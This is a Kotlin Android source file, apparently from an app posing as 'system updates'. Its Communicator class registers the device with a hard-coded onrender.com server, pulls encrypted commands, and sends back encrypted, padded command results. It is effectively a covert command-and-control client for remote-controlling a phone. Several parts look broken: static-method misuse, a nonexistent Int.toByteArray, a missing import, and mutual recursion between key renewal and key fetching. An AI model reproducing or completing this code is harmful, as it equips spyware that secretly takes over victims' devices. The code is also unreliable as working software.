package com.system.updates

import android.content.Context
import android.content.SharedPreferences
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.security.*
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher
import javax.crypto.KeyAgreement
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

class Communicator(private val ctx: Context, private val cr: CryptoManager) {
    private val p: SharedPreferences = ctx.getSharedPreferences("upref", Context.MODE_PRIVATE)
    private val cl = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val jm = "application/json; charset=utf-8".toMediaType()

    private var spk: ByteArray? = null
    private var sk: ByteArray? = null
    private var ke: Long = 0
    private val kp: KeyPair? by lazy { genKp() }

    fun isR(): Boolean = p.contains("did") && p.contains("spk") && p.contains("ke")

    private fun genKp(): KeyPair? {
        return try {
            val kpg = KeyPairGenerator.getInstance("X25519")
            kpg.initialize(255)
            kpg.generateKeyPair()
        } catch (e: Exception) { null }
    }

    suspend fun reg(): Boolean = withContext(Dispatchers.IO) {
        try {
            val did = cr.getDeviceId()
            val pub = kp?.public?.encoded ?: return@withContext false
            val pub64 = Base64.encodeToString(pub, Base64.NO_WRAP)
            val jo = JSONObject().put("device_id", did).put("public_key", pub64)
            val rq = Request.Builder()
                .url("${burl()}/v16/register")
                .post(jo.toString().toRequestBody(jm))
                .build()
            cl.newCall(rq).execute().use { resp ->
                if (resp.isSuccessful) {
                    val js = JSONObject(resp.body!!.string())
                    val spk64 = js.getString("server_public_key")
                    spk = Base64.decode(spk64, Base64.NO_WRAP)
                    sk = computeSecret(spk!!)
                    ke = js.getLong("key_expiry")
                    p.edit().putString("did", did).putString("spk", spk64).putLong("ke", ke).apply()
                    return@withContext true
                }
            }
        } catch (e: Exception) { Log.e("Comm", "reg err", e) }
        return@withContext false
    }

    private fun computeSecret(spk: ByteArray): ByteArray? {
        return try {
            val ka = KeyAgreement.getInstance("X25519")
            ka.init(kp?.private)
            ka.doPhase(KeyFactory.getInstance("X25519").generatePublic(X509EncodedKeySpec(spk)), true)
            val sec = ka.generateSecret()
            val md = MessageDigest.getInstance("SHA-256")
            md.digest(sec)
        } catch (e: Exception) { null }
    }

    suspend fun fetch(): List<JSONObject> = withContext(Dispatchers.IO) {
        val lst = mutableListOf<JSONObject>()
        try {
            val did = p.getString("did", "") ?: return@withContext lst
            val s = getSk() ?: return@withContext lst
            val n = nonce()
            val sig = sign(did, n, s)
            val rq = Request.Builder()
                .url("${burl()}/v16/pull")
                .header("X-Device-ID", did)
                .header("X-Nonce", n)
                .header("X-Signature", sig)
                .get()
                .build()
            cl.newCall(rq).execute().use { resp ->
                if (resp.isSuccessful) {
                    val arr = JSONArray(resp.body!!.string())
                    for (i in 0 until arr.length()) {
                        val eb64 = arr.getString(i)
                        val e = Base64.decode(eb64, Base64.NO_WRAP)
                        val rl = (e[0].toInt() and 0xFF shl 8) or (e[1].toInt() and 0xFF)
                        val ep = e.copyOfRange(2, 2 + rl)
                        val dec = cr.decryptData(ep, did.toByteArray())
                        lst.add(JSONObject(String(dec)))
                    }
                }
            }
        } catch (e: Exception) { Log.e("Comm", "fetch err", e) }
        return@withContext lst
    }

    suspend fun sendRes(cmd: JSONObject, res: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val did = p.getString("did", "") ?: return@withContext false
            val s = getSk() ?: return@withContext false
            val pl = JSONObject()
                .put("type", "cmd_res")
                .put("cmd_id", cmd.optInt("ticket_id"))
                .put("result", res)
                .put("success", true)
            val enc = cr.encryptData(pl.toString().toByteArray(), did.toByteArray())
            val pad = ByteArray(256 + java.security.SecureRandom().getInstanceStrong().nextInt(512))
            java.security.SecureRandom().getInstanceStrong().nextBytes(pad)
            val fin = (enc.size.toByteArray()) + enc + pad
            val p64 = Base64.encodeToString(fin, Base64.NO_WRAP)
            val jo = JSONObject().put("payload", p64)
            val n = nonce()
            val sig = sign(did, n, s)
            val rq = Request.Builder()
                .url("${burl()}/v16/push")
                .header("X-Device-ID", did)
                .header("X-Nonce", n)
                .header("X-Signature", sig)
                .post(jo.toString().toRequestBody(jm))
                .build()
            cl.newCall(rq).execute().use { resp -> return@withContext resp.isSuccessful }
        } catch (e: Exception) { Log.e("Comm", "send err", e) }
        return@withContext false
    }

    private fun burl(): String = p.getString("burl", "https://system-updates.onrender.com") ?: "https://system-updates.onrender.com"

    private fun getSk(): ByteArray? {
        val exp = p.getLong("ke", 0)
        if (System.currentTimeMillis() / 1000 > exp) { sk = null; return null }
        if (sk == null) {
            val spk64 = p.getString("spk", "") ?: return null
            spk = Base64.decode(spk64, Base64.NO_WRAP)
            sk = computeSecret(spk!!)
        }
        if (exp - System.currentTimeMillis() / 1000 < 600) { renew() }
        return sk
    }

    private fun renew() {
        try {
            val did = p.getString("did", "") ?: return
            val s = getSk() ?: return
            val pl = JSONObject().put("type", "renew_key")
            val enc = cr.encryptData(pl.toString().toByteArray(), did.toByteArray())
            val pad = ByteArray(256)
            java.security.SecureRandom().getInstanceStrong().nextBytes(pad)
            val fin = (enc.size.toByteArray()) + enc + pad
            val p64 = Base64.encodeToString(fin, Base64.NO_WRAP)
            val jo = JSONObject().put("payload", p64)
            val n = nonce()
            val sig = sign(did, n, s)
            val rq = Request.Builder()
                .url("${burl()}/v16/push")
                .header("X-Device-ID", did)
                .header("X-Nonce", n)
                .header("X-Signature", sig)
                .post(jo.toString().toRequestBody(jm))
                .build()
            cl.newCall(rq).enqueue(object : Callback {
                override fun onFailure(c: Call, e: IOException) {}
                override fun onResponse(c: Call, r: Response) { r.close() }
            })
        } catch (e: Exception) {}
    }

    private fun nonce(): String {
        val b = ByteArray(16)
        java.security.SecureRandom().getInstanceStrong().nextBytes(b)
        return Base64.encodeToString(b, Base64.NO_WRAP)
    }

    private fun sign(did: String, n: String, k: ByteArray): String {
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(k, "HmacSHA256"))
        return Base64.encodeToString(mac.doFinal("$did:$n".toByteArray()), Base64.NO_WRAP)
    }
}